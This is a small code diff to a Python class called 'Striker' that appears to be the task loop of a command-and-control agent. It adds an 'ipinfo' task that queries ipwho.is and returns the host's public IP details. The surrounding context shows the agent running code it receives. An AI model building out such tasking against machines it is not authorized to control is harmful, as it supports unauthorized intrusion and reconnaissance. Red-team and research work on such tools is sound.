@@ -281,6 +281,13 @@ class Striker:
           successful = 1
         except Exception as e:
           result = "Error running code: " + str(e)
+    elif (task["taskType"] == "ipinfo"):
+      status, body = self.httpGet("https://ipwho.is")
+      if status == 0:
+        result = "Error: " + body
+      else:
+        result = body
+        successful = 1
     else:
       result = "Not implemented!"
     task["result"] = {"uid":taskID, "result":result, "successful": successful}
